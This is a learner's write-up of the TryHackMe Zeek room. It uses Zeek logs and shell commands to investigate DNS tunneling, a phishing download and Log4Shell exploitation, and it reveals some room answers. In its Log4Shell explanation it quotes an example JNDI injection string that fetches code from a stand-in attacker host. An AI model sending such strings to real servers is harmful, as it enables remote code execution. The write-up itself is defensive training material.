# Zeek — TryHackMe

**Difficulty**: Medium 
**Category**: Network Forensics / Zeek NIDS
**Date**: June 2026


---

## Honest Reflection

The room felt easier than expected 
for a medium difficulty room — a sign that my network 
forensics skills are genuinely improving.

**What I did well:**
- Most questions answered by directly reading log files
- Applied grep, cut, sort, uniq independently without hints
- Figured out file extraction from Zeek logs independently
- Recognised base64 encoding immediately and decoded in CyberChef
- Used VirusTotal relations tab correctly without guidance

**One question needed a hint:**
Question 3 — unique DNS queries. My initial approach was 
close but not quite right. Used the hint command and 
modified it myself to get the final answer.

**Key milestone:**
This room proves that consistent practice is working. 
Rooms that would have taken me 6+ hours before now take 
under 2 hours.

---

## What is Zeek?

Zeek (formerly Bro) is a powerful network analysis framework 
used by SOC teams to inspect network traffic and generate 
structured log files automatically.

Unlike Wireshark which shows raw packets, Zeek automatically 
creates separate log files for each protocol:
- dns.log — all DNS queries and responses
- conn.log — all network connections with duration
- http.log — all HTTP requests and responses
- files.log — all files transferred over the network
- signature.log — signature-based detection hits

**Why SOC teams use Zeek:**
Instead of manually parsing thousands of packets in Wireshark, 
Zeek gives you clean structured logs you can grep, cut, and 
sort instantly. Much faster for threat hunting.

---

## Essential Zeek Commands

```bash
# Generate Zeek logs from a PCAP file
zeek -C -r filename.pcap

# Generate logs with a specific script
zeek -C -r filename.pcap scriptname.zeek

# View log file headers to understand fields
head dns.log

# Extract specific fields using zeek-cut
cat dns.log | zeek-cut fieldname

# Count lines
cat file.log | wc -l
```

---

## Task 1 — DNS Tunneling Analysis

**File**: dns-tunneling.pcap → dns.log + conn.log

---

### Q1: Number of DNS records linked to IPv6 address

**Concept:**
IPv6 DNS records use AAAA record type (as opposed to A 
records for IPv4). AAAA because IPv6 addresses are four 
times longer than IPv4.

**How I found it:**
```bash
cat dns.log | grep "AAAA" | wc -l
```

- grep "AAAA" filters only IPv6 DNS records
- wc -l counts the number of matching lines

---

### Q2: Longest connection duration

**Concept:**
conn.log records every network connection with its duration 
in seconds. Field 9 contains the connection duration 
(interval). Sorting numerically reveals the longest.

**How I found it:**
```bash
cat conn.log | zeek-cut intervaL | sort  
```

Or using cut on the raw field:
```bash
cat conn.log | grep -v "#" | cut -f 9 | sort -n | tail -1
```

- cut -f 9 extracts the 9th field (duration)
- sort -n sorts numerically
- tail -1 shows the largest value

---

### Q3: Number of unique domain queries

**Concept:**
DNS logs contain full domain queries including subdomains. 
To find unique base domains (not subdomains) you need to 
extract just the last two parts of each domain.

Example:
- sub.evil.com → evil.com
- mail.evil.com → evil.com
Both count as one unique domain.

**How I found it:**
Used the hint command and modified the ending:
```bash
cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq | wc -l
```

Breaking this down:
- `zeek-cut query` — extracts the query field
- `rev` — reverses each string (com.evil.sub becomes bus.live.moc)
- `cut -d '.' -f 1-2` — takes first two dot-separated fields 
  (which after reversing = last two of original)
- `rev` again — reverses back to normal
- `sort | uniq` — removes duplicates
- `wc -l` — counts unique results

**What I learned:**
The rev trick is an elegant way to extract base domains 
without complex regex. Reverse the string, cut from the 
left, reverse back.

---

### Q4: IP address of source host doing massive DNS queries

**Concept:**
DNS tunneling involves sending enormous amounts of DNS 
queries from a single host to encode data. Looking at 
conn.log shows which source IP has an abnormally high 
number of connections.

**How I found it:**
```bash
cat conn.log | zeek-cut id.orig_h | sort | uniq -c | sort -n
```

One IP had significantly more connections than any other. 
That was the answer.

**Red flag pattern:**
In normal traffic, DNS queries are spread across many 
different domains. If one host is sending hundreds or 
thousands of queries to the same domain — that is 
DNS tunneling. Data is being encoded in DNS queries 
to bypass firewalls.

---

## Task 2 — Phishing Analysis

**File**: phishing.pcap

**First step — generate all logs:**
```bash
zeek -C -r phishing.pcap
```
This generates dns.log, http.log, files.log, conn.log 
all at once from the PCAP.

---

### Q5: Suspicious source address (defanged)

**How I found it:**
```bash
cat dns.log | zeek-cut id.orig_h | sort | uniq -c | sort -rn | head
```

One IP stood out as making suspicious DNS queries. 
Defang the IP before submitting:
- Replace dots with [.]
- Example: 192.168.1.1 → 192[.]168[.]1[.]1

**Why defang:**
Defanging prevents accidental clicking on malicious 
indicators in reports. Standard practice in threat 
intelligence sharing.

---

### Q6: Domain malicious files were downloaded from (defanged)

**How I found it:**
```bash
cat http.log | zeek-cut host uri
```

The domain hosting malicious files was clearly visible 
in the host field of HTTP log entries. Defang before 
submitting.

**Key pattern:**
http.log host field shows the domain of every HTTP 
request. Malicious downloads stand out because the 
domain is unfamiliar and the URI path often contains 
suspicious filenames.

---

### Q7: File type associated with malicious document

**This question required extra steps — file extraction**

**How I found it:**

First I needed to extract the actual files from the PCAP. 
Googled how to do this and found Zeek has a built-in 
file extraction script.

```bash
# Found extraction script inside phishing folder
zeek -C -r phishing.pcap /path/to/extract-files.zeek
```

This created an extract_files folder with all files 
transferred in the PCAP.

```bash
# Get MD5 hash of the suspicious document
md5sum suspicious_document.doc
```

Took that MD5 hash to VirusTotal:
1. Paste hash into VirusTotal search
2. Go to Relations tab
3. Look at File Types section

**Answer: VBA**

VBA = Visual Basic for Applications. The malicious Word 
document contained a VBA macro that executed malicious 
code when opened. This is one of the most common 
phishing payload delivery methods.

**Key pattern:**
.doc or .docx files containing VBA macros are classic 
phishing attachments. Real SOC teams configure email 
gateways to block or sandbox documents with macros.

---

### Q8: File name of extracted malicious .exe in VirusTotal

**How I found it:**
```bash
md5sum extracted_malicious.exe
```

Pasted MD5 into VirusTotal. The Details tab shows 
the file name VirusTotal has on record for that hash.

---

### Q9: Contacted domain name from malicious .exe (defanged)

**How I found it:**
In VirusTotal with the exe hash open:
- Go to Relations tab
- Look at Contacted Domains section

Domain visible immediately. Defang before submitting.

---

### Q10: Request name of downloaded malicious .exe

**How I found it:**
```bash
cat http.log | zeek-cut uri | grep ".exe"
```

The URI field in http.log shows the exact filename 
that was requested during the download.

---

## Task 3 — Log4Shell Detection

**File**: log4shell.pcapng + detection-log4j.zeek script

**First step:**
```bash
zeek -C -r log4shell.pcapng detection-log4j.zeek
```

Running the detection script alongside the PCAP generates 
a signature.log file containing Log4Shell exploit attempts.

---

### Q11: Number of signature hits

**How I found it:**
```bash
cat signature.log | grep -v "#" | wc -l
```

Or count specific signature IDs:
```bash
cat signature.log | zeek-cut sig_id | sort | uniq -c
```

---

### Q12: Tool used for scanning

**How I found it:**
```bash
cat http.log | zeek-cut user_agent
```

The User-Agent field in HTTP requests reveals what tool 
made the request. Security scanning tools have 
recognisable User-Agent strings.

**Key pattern:**
Legitimate browsers have User-Agents like Mozilla/5.0.
Scanning tools like Nmap, Nikto, or custom exploit 
frameworks have distinctive or unusual User-Agents. 
Always check User-Agent in http.log when investigating 
web-based attacks.

---

### Q13: Extension of the exploit file

**How I found it:**
```bash
cat http.log | zeek-cut uri | head -20
```

The exploit file extension was visible at the top of 
the URI list in http.log. Also visible in the referrer 
field of some entries.

---

### Q14: Name of file created from decoded base64 commands

**How I found it:**
```bash
cat log4j.log | zeek-cut value | head -20
```

The log4j.log contained base64 encoded commands near 
the top. Copied the encoded strings to CyberChef:
gchq.github.io/CyberChef → From Base64

The decoded output was a shell command that created 
a specific file. That filename was the answer.

**What Log4Shell actually is:**
Log4Shell (CVE-2021-44228) is a critical vulnerability 
in the Java Log4j library. Attackers send a specially 
crafted string like:
${jndi:ldap://attacker.com/exploit}
When Log4j logs this string, it fetches and executes 
code from the attacker's server. The base64 encoding 
hides the actual payload from basic detection.

---

## Zeek Log Fields Reference

**conn.log key fields:**
ts          — timestamp
id.orig_h   — source IP
id.orig_p   — source port
id.resp_h   — destination IP
id.resp_p   — destination port
duration    — connection length in seconds

**dns.log key fields:**
ts          — timestamp
id.orig_h   — querying host IP
query       — domain being queried
qtype_name  — record type (A, AAAA, MX, TXT etc)
answers     — DNS response

**http.log key fields:**
ts          — timestamp
id.orig_h   — client IP
host        — destination domain
uri         — requested path/filename
user_agent  — browser or tool making request
status_code — HTTP response code

---

## Command Patterns Learned

```bash
# Count occurrences and sort by frequency
cat file.log | zeek-cut fieldname | sort | uniq -c | sort -rn

# Extract base domains from full DNS queries
cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq

# Find files transferred in PCAP
zeek -C -r file.pcap extract-files.zeek

# Get MD5 of extracted file for VirusTotal lookup
md5sum filename

# Find scanning tools via User-Agent
cat http.log | zeek-cut user_agent | sort | uniq

# Find all executable downloads
cat http.log | zeek-cut uri | grep -i ".exe\|.dll\|.ps1\|.vbs"
```

---

## Key Takeaways

**DNS tunneling indicators:**
- Massive number of queries from single host
- Long unusual subdomain strings in queries
- AAAA record abuse for data encoding
- Consistent destination domain across all queries

**Phishing indicators in Zeek logs:**
- Suspicious domain in http.log host field
- .doc/.exe downloads from unknown domains
- VBA macros in document files

**Log4Shell indicators:**
- jndi:ldap strings in http.log URIs
- Base64 encoded commands in log4j.log
- Unusual User-Agent strings from scanners
- High volume of exploit attempts from single IP

**VirusTotal workflow:**
1. Extract file from PCAP using Zeek script
2. Get MD5 hash with md5sum
3. Search hash in VirusTotal
4. Check Relations tab for file type, contacted domains, 
   dropped files

---

## Personal Progress Note

Compared to my first rooms where I spent 6+ hours and 
still needed writeups for most answers, completing this 
14-question medium room in 1.3 hours with minimal help 
shows real measurable improvement.

The framework is working:
- Identify what type of answer is needed
- Match to the right log file
- Pick the right command
- Read the output carefully

What used to feel like impossible pattern recognition 
is starting to feel like natural instinct.
